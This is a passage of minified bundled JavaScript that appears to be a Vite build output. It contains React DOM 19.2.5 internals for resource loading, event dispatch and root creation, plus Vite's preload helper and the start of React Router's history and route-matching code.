    function Nf(e, t, n, r) {
      e.querySelector(`link[rel="preload"][as="style"][` + t + `]`)
        ? (r.loading = 1)
        : ((t = e.createElement(`link`)),
          (r.preload = t),
          t.addEventListener(`load`, function () {
            return (r.loading |= 1);
          }),
          t.addEventListener(`error`, function () {
            return (r.loading |= 2);
          }),
          Pd(t, `link`, n),
          wt(t),
          e.head.appendChild(t));
    }
    function Pf(e) {
      return `[src="` + Ut(e) + `"]`;
    }
    function Ff(e) {
      return `script[async]` + e;
    }
    function If(e, t, n) {
      if ((t.count++, t.instance === null))
        switch (t.type) {
          case `style`:
            var r = e.querySelector(`style[data-href~="` + Ut(n.href) + `"]`);
            if (r) return ((t.instance = r), wt(r), r);
            var a = h({}, n, {
              "data-href": n.href,
              "data-precedence": n.precedence,
              href: null,
              precedence: null,
            });
            return (
              (r = (e.ownerDocument || e).createElement(`style`)),
              wt(r),
              Pd(r, `style`, a),
              Lf(r, n.precedence, e),
              (t.instance = r)
            );
          case `stylesheet`:
            a = Af(n.href);
            var o = e.querySelector(jf(a));
            if (o) return ((t.state.loading |= 4), (t.instance = o), wt(o), o);
            ((r = Mf(n)),
              (a = mf.get(a)) && Rf(r, a),
              (o = (e.ownerDocument || e).createElement(`link`)),
              wt(o));
            var s = o;
            return (
              (s._p = new Promise(function (e, t) {
                ((s.onload = e), (s.onerror = t));
              })),
              Pd(o, `link`, r),
              (t.state.loading |= 4),
              Lf(o, n.precedence, e),
              (t.instance = o)
            );
          case `script`:
            return (
              (o = Pf(n.src)),
              (a = e.querySelector(Ff(o)))
                ? ((t.instance = a), wt(a), a)
                : ((r = n),
                  (a = mf.get(o)) && ((r = h({}, n)), zf(r, a)),
                  (e = e.ownerDocument || e),
                  (a = e.createElement(`script`)),
                  wt(a),
                  Pd(a, `link`, r),
                  e.head.appendChild(a),
                  (t.instance = a))
            );
          case `void`:
            return null;
          default:
            throw Error(i(443, t.type));
        }
      else
        t.type === `stylesheet` &&
          !(t.state.loading & 4) &&
          ((r = t.instance), (t.state.loading |= 4), Lf(r, n.precedence, e));
      return t.instance;
    }
    function Lf(e, t, n) {
      for (
        var r = n.querySelectorAll(
            `link[rel="stylesheet"][data-precedence],style[data-precedence]`,
          ),
          i = r.length ? r[r.length - 1] : null,
          a = i,
          o = 0;
        o < r.length;
        o++
      ) {
        var s = r[o];
        if (s.dataset.precedence === t) a = s;
        else if (a !== i) break;
      }
      a
        ? a.parentNode.insertBefore(e, a.nextSibling)
        : ((t = n.nodeType === 9 ? n.head : n),
          t.insertBefore(e, t.firstChild));
    }
    function Rf(e, t) {
      ((e.crossOrigin ??= t.crossOrigin),
        (e.referrerPolicy ??= t.referrerPolicy),
        (e.title ??= t.title));
    }
    function zf(e, t) {
      ((e.crossOrigin ??= t.crossOrigin),
        (e.referrerPolicy ??= t.referrerPolicy),
        (e.integrity ??= t.integrity));
    }
    var Bf = null;
    function Vf(e, t, n) {
      if (Bf === null) {
        var r = new Map(),
          i = (Bf = new Map());
        i.set(n, r);
      } else ((i = Bf), (r = i.get(n)), r || ((r = new Map()), i.set(n, r)));
      if (r.has(e)) return r;
      for (
        r.set(e, null), n = n.getElementsByTagName(e), i = 0;
        i < n.length;
        i++
      ) {
        var a = n[i];
        if (
          !(
            a[vt] ||
            a[dt] ||
            (e === `link` && a.getAttribute(`rel`) === `stylesheet`)
          ) &&
          a.namespaceURI !== `http://www.w3.org/2000/svg`
        ) {
          var o = a.getAttribute(t) || ``;
          o = e + o;
          var s = r.get(o);
          s ? s.push(a) : r.set(o, [a]);
        }
      }
      return r;
    }
    function Hf(e, t, n) {
      ((e = e.ownerDocument || e),
        e.head.insertBefore(
          n,
          t === `title` ? e.querySelector(`head > title`) : null,
        ));
    }
    function Uf(e, t, n) {
      if (n === 1 || t.itemProp != null) return !1;
      switch (e) {
        case `meta`:
        case `title`:
          return !0;
        case `style`:
          if (
            typeof t.precedence != `string` ||
            typeof t.href != `string` ||
            t.href === ``
          )
            break;
          return !0;
        case `link`:
          if (
            typeof t.rel != `string` ||
            typeof t.href != `string` ||
            t.href === `` ||
            t.onLoad ||
            t.onError
          )
            break;
          switch (t.rel) {
            case `stylesheet`:
              return (
                (e = t.disabled),
                typeof t.precedence == `string` && e == null
              );
            default:
              return !0;
          }
        case `script`:
          if (
            t.async &&
            typeof t.async != `function` &&
            typeof t.async != `symbol` &&
            !t.onLoad &&
            !t.onError &&
            t.src &&
            typeof t.src == `string`
          )
            return !0;
      }
      return !1;
    }
    function Wf(e) {
      return !(e.type === `stylesheet` && !(e.state.loading & 3));
    }
    function Gf(e, t, n, r) {
      if (
        n.type === `stylesheet` &&
        (typeof r.media != `string` || !1 !== matchMedia(r.media).matches) &&
        !(n.state.loading & 4)
      ) {
        if (n.instance === null) {
          var i = Af(r.href),
            a = t.querySelector(jf(i));
          if (a) {
            ((t = a._p),
              typeof t == `object` &&
                t &&
                typeof t.then == `function` &&
                (e.count++, (e = Jf.bind(e)), t.then(e, e)),
              (n.state.loading |= 4),
              (n.instance = a),
              wt(a));
            return;
          }
          ((a = t.ownerDocument || t),
            (r = Mf(r)),
            (i = mf.get(i)) && Rf(r, i),
            (a = a.createElement(`link`)),
            wt(a));
          var o = a;
          ((o._p = new Promise(function (e, t) {
            ((o.onload = e), (o.onerror = t));
          })),
            Pd(a, `link`, r),
            (n.instance = a));
        }
        (e.stylesheets === null && (e.stylesheets = new Map()),
          e.stylesheets.set(n, t),
          (t = n.state.preload) &&
            !(n.state.loading & 3) &&
            (e.count++,
            (n = Jf.bind(e)),
            t.addEventListener(`load`, n),
            t.addEventListener(`error`, n)));
      }
    }
    var Kf = 0;
    function qf(e, t) {
      return (
        e.stylesheets && e.count === 0 && Xf(e, e.stylesheets),
        0 < e.count || 0 < e.imgCount
          ? function (n) {
              var r = setTimeout(function () {
                if ((e.stylesheets && Xf(e, e.stylesheets), e.unsuspend)) {
                  var t = e.unsuspend;
                  ((e.unsuspend = null), t());
                }
              }, 6e4 + t);
              0 < e.imgBytes && Kf === 0 && (Kf = 62500 * Ld());
              var i = setTimeout(
                function () {
                  if (
                    ((e.waitingForImages = !1),
                    e.count === 0 &&
                      (e.stylesheets && Xf(e, e.stylesheets), e.unsuspend))
                  ) {
                    var t = e.unsuspend;
                    ((e.unsuspend = null), t());
                  }
                },
                (e.imgBytes > Kf ? 50 : 800) + t,
              );
              return (
                (e.unsuspend = n),
                function () {
                  ((e.unsuspend = null), clearTimeout(r), clearTimeout(i));
                }
              );
            }
          : null
      );
    }
    function Jf() {
      if (
        (this.count--,
        this.count === 0 && (this.imgCount === 0 || !this.waitingForImages))
      ) {
        if (this.stylesheets) Xf(this, this.stylesheets);
        else if (this.unsuspend) {
          var e = this.unsuspend;
          ((this.unsuspend = null), e());
        }
      }
    }
    var Yf = null;
    function Xf(e, t) {
      ((e.stylesheets = null),
        e.unsuspend !== null &&
          (e.count++,
          (Yf = new Map()),
          t.forEach(Zf, e),
          (Yf = null),
          Jf.call(e)));
    }
    function Zf(e, t) {
      if (!(t.state.loading & 4)) {
        var n = Yf.get(e);
        if (n) var r = n.get(null);
        else {
          ((n = new Map()), Yf.set(e, n));
          for (
            var i = e.querySelectorAll(
                `link[data-precedence],style[data-precedence]`,
              ),
              a = 0;
            a < i.length;
            a++
          ) {
            var o = i[a];
            (o.nodeName === `LINK` || o.getAttribute(`media`) !== `not all`) &&
              (n.set(o.dataset.precedence, o), (r = o));
          }
          r && n.set(null, r);
        }
        ((i = t.instance),
          (o = i.getAttribute(`data-precedence`)),
          (a = n.get(o) || r),
          a === r && n.set(null, i),
          n.set(o, i),
          this.count++,
          (r = Jf.bind(this)),
          i.addEventListener(`load`, r),
          i.addEventListener(`error`, r),
          a
            ? a.parentNode.insertBefore(i, a.nextSibling)
            : ((e = e.nodeType === 9 ? e.head : e),
              e.insertBefore(i, e.firstChild)),
          (t.state.loading |= 4));
      }
    }
    var Qf = {
      $$typeof: C,
      Provider: null,
      Consumer: null,
      _currentValue: oe,
      _currentValue2: oe,
      _threadCount: 0,
    };
    function $f(e, t, n, r, i, a, o, s, c) {
      ((this.tag = 1),
        (this.containerInfo = e),
        (this.pingCache = this.current = this.pendingChildren = null),
        (this.timeoutHandle = -1),
        (this.callbackNode =
          this.next =
          this.pendingContext =
          this.context =
          this.cancelPendingCommit =
            null),
        (this.callbackPriority = 0),
        (this.expirationTimes = et(-1)),
        (this.entangledLanes =
          this.shellSuspendCounter =
          this.errorRecoveryDisabledLanes =
          this.expiredLanes =
          this.warmLanes =
          this.pingedLanes =
          this.suspendedLanes =
          this.pendingLanes =
            0),
        (this.entanglements = et(0)),
        (this.hiddenUpdates = et(null)),
        (this.identifierPrefix = r),
        (this.onUncaughtError = i),
        (this.onCaughtError = a),
        (this.onRecoverableError = o),
        (this.pooledCache = null),
        (this.pooledCacheLanes = 0),
        (this.formState = c),
        (this.incompleteTransitions = new Map()));
    }
    function ep(e, t, n, r, i, a, o, s, c, l, u, d) {
      return (
        (e = new $f(e, t, n, o, c, l, u, d, s)),
        (t = 1),
        !0 === a && (t |= 24),
        (a = di(3, null, null, t)),
        (e.current = a),
        (a.stateNode = e),
        (t = sa()),
        t.refCount++,
        (e.pooledCache = t),
        t.refCount++,
        (a.memoizedState = { element: r, isDehydrated: n, cache: t }),
        Ra(a),
        e
      );
    }
    function tp(e) {
      return e ? ((e = li), e) : li;
    }
    function np(e, t, n, r, i, a) {
      ((i = tp(i)),
        r.context === null ? (r.context = i) : (r.pendingContext = i),
        (r = Ba(t)),
        (r.payload = { element: n }),
        (a = a === void 0 ? null : a),
        a !== null && (r.callback = a),
        (n = Va(e, r, t)),
        n !== null && (hu(n, e, t), Ha(n, e, t)));
    }
    function rp(e, t) {
      if (((e = e.memoizedState), e !== null && e.dehydrated !== null)) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t;
      }
    }
    function ip(e, t) {
      (rp(e, t), (e = e.alternate) && rp(e, t));
    }
    function ap(e) {
      if (e.tag === 13 || e.tag === 31) {
        var t = oi(e, 67108864);
        (t !== null && hu(t, e, 67108864), ip(e, 67108864));
      }
    }
    function op(e) {
      if (e.tag === 13 || e.tag === 31) {
        var t = pu();
        t = ot(t);
        var n = oi(e, t);
        (n !== null && hu(n, e, t), ip(e, t));
      }
    }
    var sp = !0;
    function cp(e, t, n, r) {
      var i = A.T;
      A.T = null;
      var a = j.p;
      try {
        ((j.p = 2), up(e, t, n, r));
      } finally {
        ((j.p = a), (A.T = i));
      }
    }
    function lp(e, t, n, r) {
      var i = A.T;
      A.T = null;
      var a = j.p;
      try {
        ((j.p = 8), up(e, t, n, r));
      } finally {
        ((j.p = a), (A.T = i));
      }
    }
    function up(e, t, n, r) {
      if (sp) {
        var i = dp(r);
        if (i === null) (wd(e, t, r, fp, n), Cp(e, r));
        else if (Tp(i, e, t, n, r)) r.stopPropagation();
        else if ((Cp(e, r), t & 4 && -1 < Sp.indexOf(e))) {
          for (; i !== null; ) {
            var a = xt(i);
            if (a !== null)
              switch (a.tag) {
                case 3:
                  if (
                    ((a = a.stateNode), a.current.memoizedState.isDehydrated)
                  ) {
                    var o = Ye(a.pendingLanes);
                    if (o !== 0) {
                      var s = a;
                      for (s.pendingLanes |= 2, s.entangledLanes |= 2; o; ) {
                        var c = 1 << (31 - He(o));
                        ((s.entanglements[1] |= c), (o &= ~c));
                      }
                      (rd(a), !(K & 6) && ((tu = Ae() + 500), id(0, !1)));
                    }
                  }
                  break;
                case 31:
                case 13:
                  ((s = oi(a, 2)), s !== null && hu(s, a, 2), bu(), ip(a, 2));
              }
            if (((a = dp(r)), a === null && wd(e, t, r, fp, n), a === i)) break;
            i = a;
          }
          i !== null && r.stopPropagation();
        } else wd(e, t, r, null, n);
      }
    }
    function dp(e) {
      return ((e = sn(e)), pp(e));
    }
    var fp = null;
    function pp(e) {
      if (((fp = null), (e = bt(e)), e !== null)) {
        var t = o(e);
        if (t === null) e = null;
        else {
          var n = t.tag;
          if (n === 13) {
            if (((e = s(t)), e !== null)) return e;
            e = null;
          } else if (n === 31) {
            if (((e = c(t)), e !== null)) return e;
            e = null;
          } else if (n === 3) {
            if (t.stateNode.current.memoizedState.isDehydrated)
              return t.tag === 3 ? t.stateNode.containerInfo : null;
            e = null;
          } else t !== e && (e = null);
        }
      }
      return ((fp = e), null);
    }
    function mp(e) {
      switch (e) {
        case `beforetoggle`:
        case `cancel`:
        case `click`:
        case `close`:
        case `contextmenu`:
        case `copy`:
        case `cut`:
        case `auxclick`:
        case `dblclick`:
        case `dragend`:
        case `dragstart`:
        case `drop`:
        case `focusin`:
        case `focusout`:
        case `input`:
        case `invalid`:
        case `keydown`:
        case `keypress`:
        case `keyup`:
        case `mousedown`:
        case `mouseup`:
        case `paste`:
        case `pause`:
        case `play`:
        case `pointercancel`:
        case `pointerdown`:
        case `pointerup`:
        case `ratechange`:
        case `reset`:
        case `resize`:
        case `seeked`:
        case `submit`:
        case `toggle`:
        case `touchcancel`:
        case `touchend`:
        case `touchstart`:
        case `volumechange`:
        case `change`:
        case `selectionchange`:
        case `textInput`:
        case `compositionstart`:
        case `compositionend`:
        case `compositionupdate`:
        case `beforeblur`:
        case `afterblur`:
        case `beforeinput`:
        case `blur`:
        case `fullscreenchange`:
        case `focus`:
        case `hashchange`:
        case `popstate`:
        case `select`:
        case `selectstart`:
          return 2;
        case `drag`:
        case `dragenter`:
        case `dragexit`:
        case `dragleave`:
        case `dragover`:
        case `mousemove`:
        case `mouseout`:
        case `mouseover`:
        case `pointermove`:
        case `pointerout`:
        case `pointerover`:
        case `scroll`:
        case `touchmove`:
        case `wheel`:
        case `mouseenter`:
        case `mouseleave`:
        case `pointerenter`:
        case `pointerleave`:
          return 8;
        case `message`:
          switch (je()) {
            case Me:
              return 2;
            case Ne:
              return 8;
            case Pe:
            case Fe:
              return 32;
            case Ie:
              return 268435456;
            default:
              return 32;
          }
        default:
          return 32;
      }
    }
    var hp = !1,
      gp = null,
      _p = null,
      vp = null,
      yp = new Map(),
      bp = new Map(),
      xp = [],
      Sp =
        `mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset`.split(
          ` `,
        );
    function Cp(e, t) {
      switch (e) {
        case `focusin`:
        case `focusout`:
          gp = null;
          break;
        case `dragenter`:
        case `dragleave`:
          _p = null;
          break;
        case `mouseover`:
        case `mouseout`:
          vp = null;
          break;
        case `pointerover`:
        case `pointerout`:
          yp.delete(t.pointerId);
          break;
        case `gotpointercapture`:
        case `lostpointercapture`:
          bp.delete(t.pointerId);
      }
    }
    function wp(e, t, n, r, i, a) {
      return e === null || e.nativeEvent !== a
        ? ((e = {
            blockedOn: t,
            domEventName: n,
            eventSystemFlags: r,
            nativeEvent: a,
            targetContainers: [i],
          }),
          t !== null && ((t = xt(t)), t !== null && ap(t)),
          e)
        : ((e.eventSystemFlags |= r),
          (t = e.targetContainers),
          i !== null && t.indexOf(i) === -1 && t.push(i),
          e);
    }
    function Tp(e, t, n, r, i) {
      switch (t) {
        case `focusin`:
          return ((gp = wp(gp, e, t, n, r, i)), !0);
        case `dragenter`:
          return ((_p = wp(_p, e, t, n, r, i)), !0);
        case `mouseover`:
          return ((vp = wp(vp, e, t, n, r, i)), !0);
        case `pointerover`:
          var a = i.pointerId;
          return (yp.set(a, wp(yp.get(a) || null, e, t, n, r, i)), !0);
        case `gotpointercapture`:
          return (
            (a = i.pointerId),
            bp.set(a, wp(bp.get(a) || null, e, t, n, r, i)),
            !0
          );
      }
      return !1;
    }
    function Ep(e) {
      var t = bt(e.target);
      if (t !== null) {
        var n = o(t);
        if (n !== null) {
          if (((t = n.tag), t === 13)) {
            if (((t = s(n)), t !== null)) {
              ((e.blockedOn = t),
                lt(e.priority, function () {
                  op(n);
                }));
              return;
            }
          } else if (t === 31) {
            if (((t = c(n)), t !== null)) {
              ((e.blockedOn = t),
                lt(e.priority, function () {
                  op(n);
                }));
              return;
            }
          } else if (
            t === 3 &&
            n.stateNode.current.memoizedState.isDehydrated
          ) {
            e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
            return;
          }
        }
      }
      e.blockedOn = null;
    }
    function Dp(e) {
      if (e.blockedOn !== null) return !1;
      for (var t = e.targetContainers; 0 < t.length; ) {
        var n = dp(e.nativeEvent);
        if (n === null) {
          n = e.nativeEvent;
          var r = new n.constructor(n.type, n);
          ((on = r), n.target.dispatchEvent(r), (on = null));
        } else return ((t = xt(n)), t !== null && ap(t), (e.blockedOn = n), !1);
        t.shift();
      }
      return !0;
    }
    function Op(e, t, n) {
      Dp(e) && n.delete(t);
    }
    function kp() {
      ((hp = !1),
        gp !== null && Dp(gp) && (gp = null),
        _p !== null && Dp(_p) && (_p = null),
        vp !== null && Dp(vp) && (vp = null),
        yp.forEach(Op),
        bp.forEach(Op));
    }
    function Ap(e, n) {
      e.blockedOn === n &&
        ((e.blockedOn = null),
        hp ||
          ((hp = !0),
          t.unstable_scheduleCallback(t.unstable_NormalPriority, kp)));
    }
    var jp = null;
    function Mp(e) {
      jp !== e &&
        ((jp = e),
        t.unstable_scheduleCallback(t.unstable_NormalPriority, function () {
          jp === e && (jp = null);
          for (var t = 0; t < e.length; t += 3) {
            var n = e[t],
              r = e[t + 1],
              i = e[t + 2];
            if (typeof r != `function`) {
              if (pp(r || n) === null) continue;
              break;
            }
            var a = xt(n);
            a !== null &&
              (e.splice(t, 3),
              (t -= 3),
              Cs(
                a,
                { pending: !0, data: i, method: n.method, action: r },
                r,
                i,
              ));
          }
        }));
    }
    function Np(e) {
      function t(t) {
        return Ap(t, e);
      }
      (gp !== null && Ap(gp, e),
        _p !== null && Ap(_p, e),
        vp !== null && Ap(vp, e),
        yp.forEach(t),
        bp.forEach(t));
      for (var n = 0; n < xp.length; n++) {
        var r = xp[n];
        r.blockedOn === e && (r.blockedOn = null);
      }
      for (; 0 < xp.length && ((n = xp[0]), n.blockedOn === null); )
        (Ep(n), n.blockedOn === null && xp.shift());
      if (((n = (e.ownerDocument || e).$$reactFormReplay), n != null))
        for (r = 0; r < n.length; r += 3) {
          var i = n[r],
            a = n[r + 1],
            o = i[ft] || null;
          if (typeof a == `function`) o || Mp(n);
          else if (o) {
            var s = null;
            if (a && a.hasAttribute(`formAction`)) {
              if (((i = a), (o = a[ft] || null))) s = o.formAction;
              else if (pp(i) !== null) continue;
            } else s = o.action;
            (typeof s == `function`
              ? (n[r + 1] = s)
              : (n.splice(r, 3), (r -= 3)),
              Mp(n));
          }
        }
    }
    function Pp() {
      function e(e) {
        e.canIntercept &&
          e.info === `react-transition` &&
          e.intercept({
            handler: function () {
              return new Promise(function (e) {
                return (i = e);
              });
            },
            focusReset: `manual`,
            scroll: `manual`,
          });
      }
      function t() {
        (i !== null && (i(), (i = null)), r || setTimeout(n, 20));
      }
      function n() {
        if (!r && !navigation.transition) {
          var e = navigation.currentEntry;
          e &&
            e.url != null &&
            navigation.navigate(e.url, {
              state: e.getState(),
              info: `react-transition`,
              history: `replace`,
            });
        }
      }
      if (typeof navigation == `object`) {
        var r = !1,
          i = null;
        return (
          navigation.addEventListener(`navigate`, e),
          navigation.addEventListener(`navigatesuccess`, t),
          navigation.addEventListener(`navigateerror`, t),
          setTimeout(n, 100),
          function () {
            ((r = !0),
              navigation.removeEventListener(`navigate`, e),
              navigation.removeEventListener(`navigatesuccess`, t),
              navigation.removeEventListener(`navigateerror`, t),
              i !== null && (i(), (i = null)));
          }
        );
      }
    }
    function Fp(e) {
      this._internalRoot = e;
    }
    ((Ip.prototype.render = Fp.prototype.render =
      function (e) {
        var t = this._internalRoot;
        if (t === null) throw Error(i(409));
        var n = t.current;
        np(n, pu(), e, t, null, null);
      }),
      (Ip.prototype.unmount = Fp.prototype.unmount =
        function () {
          var e = this._internalRoot;
          if (e !== null) {
            this._internalRoot = null;
            var t = e.containerInfo;
            (np(e.current, 2, null, e, null, null), bu(), (t[pt] = null));
          }
        }));
    function Ip(e) {
      this._internalRoot = e;
    }
    Ip.prototype.unstable_scheduleHydration = function (e) {
      if (e) {
        var t = ct();
        e = { blockedOn: null, target: e, priority: t };
        for (var n = 0; n < xp.length && t !== 0 && t < xp[n].priority; n++);
        (xp.splice(n, 0, e), n === 0 && Ep(e));
      }
    };
    var Lp = n.version;
    if (Lp !== `19.2.5`) throw Error(i(527, Lp, `19.2.5`));
    j.findDOMNode = function (e) {
      var t = e._reactInternals;
      if (t === void 0)
        throw typeof e.render == `function`
          ? Error(i(188))
          : ((e = Object.keys(e).join(`,`)), Error(i(268, e)));
      return (
        (e = d(t)),
        (e = e === null ? null : p(e)),
        (e = e === null ? null : e.stateNode),
        e
      );
    };
    var Rp = {
      bundleType: 0,
      version: `19.2.5`,
      rendererPackageName: `react-dom`,
      currentDispatcherRef: A,
      reconcilerVersion: `19.2.5`,
    };
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < `u`) {
      var zp = __REACT_DEVTOOLS_GLOBAL_HOOK__;
      if (!zp.isDisabled && zp.supportsFiber)
        try {
          ((ze = zp.inject(Rp)), (Be = zp));
        } catch {}
    }
    e.createRoot = function (e, t) {
      if (!a(e)) throw Error(i(299));
      var n = !1,
        r = ``,
        o = Ks,
        s = qs,
        c = Js;
      return (
        t != null &&
          (!0 === t.unstable_strictMode && (n = !0),
          t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
          t.onUncaughtError !== void 0 && (o = t.onUncaughtError),
          t.onCaughtError !== void 0 && (s = t.onCaughtError),
          t.onRecoverableError !== void 0 && (c = t.onRecoverableError)),
        (t = ep(e, 1, !1, null, null, n, r, null, o, s, c, Pp)),
        (e[pt] = t.current),
        Sd(e),
        new Fp(t)
      );
    };
  }),
  g = o((e, t) => {
    function n() {
      if (
        !(
          typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > `u` ||
          typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != `function`
        )
      )
        try {
          __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n);
        } catch (e) {
          console.error(e);
        }
    }
    (n(), (t.exports = h()));
  }),
  _ = c(u(), 1),
  v = g(),
  y = `modulepreload`,
  b = function (e) {
    return `/` + e;
  },
  x = {},
  S = function (e, t, n) {
    let r = Promise.resolve();
    if (t && t.length > 0) {
      let e = document.getElementsByTagName(`link`),
        i = document.querySelector(`meta[property=csp-nonce]`),
        a = i?.nonce || i?.getAttribute(`nonce`);
      function o(e) {
        return Promise.all(
          e.map((e) =>
            Promise.resolve(e).then(
              (e) => ({ status: `fulfilled`, value: e }),
              (e) => ({ status: `rejected`, reason: e }),
            ),
          ),
        );
      }
      r = o(
        t.map((t) => {
          if (((t = b(t, n)), t in x)) return;
          x[t] = !0;
          let r = t.endsWith(`.css`),
            i = r ? `[rel="stylesheet"]` : ``;
          if (n)
            for (let n = e.length - 1; n >= 0; n--) {
              let i = e[n];
              if (i.href === t && (!r || i.rel === `stylesheet`)) return;
            }
          else if (document.querySelector(`link[href="${t}"]${i}`)) return;
          let o = document.createElement(`link`);
          if (
            ((o.rel = r ? `stylesheet` : y),
            r || (o.as = `script`),
            (o.crossOrigin = ``),
            (o.href = t),
            a && o.setAttribute(`nonce`, a),
            document.head.appendChild(o),
            r)
          )
            return new Promise((e, n) => {
              (o.addEventListener(`load`, e),
                o.addEventListener(`error`, () =>
                  n(Error(`Unable to preload CSS for ${t}`)),
                ));
            });
        }),
      );
    }
    function i(e) {
      let t = new Event(`vite:preloadError`, { cancelable: !0 });
      if (((t.payload = e), window.dispatchEvent(t), !t.defaultPrevented))
        throw e;
    }
    return r.then((t) => {
      for (let e of t || []) e.status === `rejected` && i(e.reason);
      return e().catch(i);
    });
  },
  C = `popstate`;
function w(e) {
  return (
    typeof e == `object` &&
    !!e &&
    `pathname` in e &&
    `search` in e &&
    `hash` in e &&
    `state` in e &&
    `key` in e
  );
}
function ee(e = {}) {
  function t(e, t) {
    let n = t.state?.masked,
      { pathname: r, search: i, hash: a } = n || e.location;
    return ne(
      ``,
      { pathname: r, search: i, hash: a },
      (t.state && t.state.usr) || null,
      (t.state && t.state.key) || `default`,
      n
        ? {
            pathname: e.location.pathname,
            search: e.location.search,
            hash: e.location.hash,
          }
        : void 0,
    );
  }
  function n(e, t) {
    return typeof t == `string` ? t : O(t);
  }
  return k(t, n, null, e);
}
function T(e, t) {
  if (e === !1 || e == null) throw Error(t);
}
function E(e, t) {
  if (!e) {
    typeof console < `u` && console.warn(t);
    try {
      throw Error(t);
    } catch {}
  }
}
function D() {
  return Math.random().toString(36).substring(2, 10);
}
function te(e, t) {
  return {
    usr: e.state,
    key: e.key,
    idx: t,
    masked: e.unstable_mask
      ? { pathname: e.pathname, search: e.search, hash: e.hash }
      : void 0,
  };
}
function ne(e, t, n = null, r, i) {
  return {
    pathname: typeof e == `string` ? e : e.pathname,
    search: ``,
    hash: ``,
    ...(typeof t == `string` ? re(t) : t),
    state: n,
    key: (t && t.key) || r || D(),
    unstable_mask: i,
  };
}
function O({ pathname: e = `/`, search: t = ``, hash: n = `` }) {
  return (
    t && t !== `?` && (e += t.charAt(0) === `?` ? t : `?` + t),
    n && n !== `#` && (e += n.charAt(0) === `#` ? n : `#` + n),
    e
  );
}
function re(e) {
  let t = {};
  if (e) {
    let n = e.indexOf(`#`);
    n >= 0 && ((t.hash = e.substring(n)), (e = e.substring(0, n)));
    let r = e.indexOf(`?`);
    (r >= 0 && ((t.search = e.substring(r)), (e = e.substring(0, r))),
      e && (t.pathname = e));
  }
  return t;
}
function k(e, t, n, r = {}) {
  let { window: i = document.defaultView, v5Compat: a = !1 } = r,
    o = i.history,
    s = `POP`,
    c = null,
    l = u();
  l ?? ((l = 0), o.replaceState({ ...o.state, idx: l }, ``));
  function u() {
    return (o.state || { idx: null }).idx;
  }
  function d() {
    s = `POP`;
    let e = u(),
      t = e == null ? null : e - l;
    ((l = e), c && c({ action: s, location: h.location, delta: t }));
  }
  function f(e, t) {
    s = `PUSH`;
    let r = w(e) ? e : ne(h.location, e, t);
    (n && n(r, e), (l = u() + 1));
    let d = te(r, l),
      f = h.createHref(r.unstable_mask || r);
    try {
      o.pushState(d, ``, f);
    } catch (e) {
      if (e instanceof DOMException && e.name === `DataCloneError`) throw e;
      i.location.assign(f);
    }
    a && c && c({ action: s, location: h.location, delta: 1 });
  }
  function p(e, t) {
    s = `REPLACE`;
    let r = w(e) ? e : ne(h.location, e, t);
    (n && n(r, e), (l = u()));
    let i = te(r, l),
      d = h.createHref(r.unstable_mask || r);
    (o.replaceState(i, ``, d),
      a && c && c({ action: s, location: h.location, delta: 0 }));
  }
  function m(e) {
    return ie(e);
  }
  let h = {
    get action() {
      return s;
    },
    get location() {
      return e(i, o);
    },
    listen(e) {
      if (c) throw Error(`A history only accepts one active listener`);
      return (
        i.addEventListener(C, d),
        (c = e),
        () => {
          (i.removeEventListener(C, d), (c = null));
        }
      );
    },
    createHref(e) {
      return t(i, e);
    },
    createURL: m,
    encodeLocation(e) {
      let t = m(e);
      return { pathname: t.pathname, search: t.search, hash: t.hash };
    },
    push: f,
    replace: p,
    go(e) {
      return o.go(e);
    },
  };
  return h;
}
function ie(e, t = !1) {
  let n = `http://localhost`;
  (typeof window < `u` &&
    (n =
      window.location.origin === `null`
        ? window.location.href
        : window.location.origin),
    T(n, `No window.location.(origin|href) available to create URL`));
  let r = typeof e == `string` ? e : O(e);
  return (
    (r = r.replace(/ $/, `%20`)),
    !t && r.startsWith(`//`) && (r = n + r),
    new URL(r, n)
  );
}
function ae(e, t, n = `/`) {
  return A(e, t, n, !1);
}
function A(e, t, n, r) {
  let i = be((typeof t == `string` ? re(t) : t).pathname || `/`, n);
  if (i == null) return null;
  let a = oe(e);
  ce(a);
  let o = null;
  for (let e = 0; o == null && e < a.length; ++e) {
    let t = ye(i);
    o = ge(a[e], t, r);
  }
  return o;
}
function j(e, t) {
  let { route: n, pathname: r, params: i } = e;
  return {
    id: n.id,
    pathname: r,
    params: i,
    data: t[n.id],
    loaderData: t[n.id],
    handle: n.handle,
  };
}
function oe(e, t = [], n = [], r = ``, i = !1) {
  let a = (e, a, o = i, s) => {
    let c = {
      relativePath: s === void 0 ? e.path || `` : s,
      caseSensitive: e.caseSensitive === !0,
      childrenIndex: a,
      route: e,
    };
    if (c.relativePath.startsWith(`/`)) {
      if (!c.relativePath.startsWith(r) && o) return;
      (T(
        c.relativePath.startsWith(r),
        `Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`,
      ),
        (c.relativePath = c.relativePath.slice(r.length)));
    }
    let l = ke([r, c.relativePath]),
      u = n.concat(c);
    (e.children &&
      e.children.length > 0 &&
      (T(
        e.index !== !0,
        `Index routes must not have child routes. Please remove all child routes from route path "${l}".`,
      ),
      oe(e.children, t, u, l, o)),
      !(e.path == null && !e.index) &&
        t.push({ path: l, score: me(l, e.index), routesMeta: u }));
  };
  return (
    e.forEach((e, t) => {
      if (e.path === `` || !e.path?.includes(`?`)) a(e, t);
      else for (let n of se(e.path)) a(e, t, !0, n);
    }),
    t
  );
}
function se(e) {
  let t = e.split(`/`);
  if (t.length === 0) return [];
  let [n, ...r] = t,
    i = n.endsWith(`?`),
    a = n.replace(/\?$/, ``);
  if (r.length === 0) return i ? [a, ``] : [a];
  let o = se(r.join(`/`)),
    s = [];
  return (
    s.push(...o.map((e) => (e === `` ? a : [a, e].join(`/`)))),
    i && s.push(...o),
    s.map((t) => (e.startsWith(`/`) && t === `` ? `/` : t))
  );
}
function ce(e) {
  e.sort((e, t) =>
    e.score === t.score
      ? he(
          e.routesMeta.map((e) => e.childrenIndex),
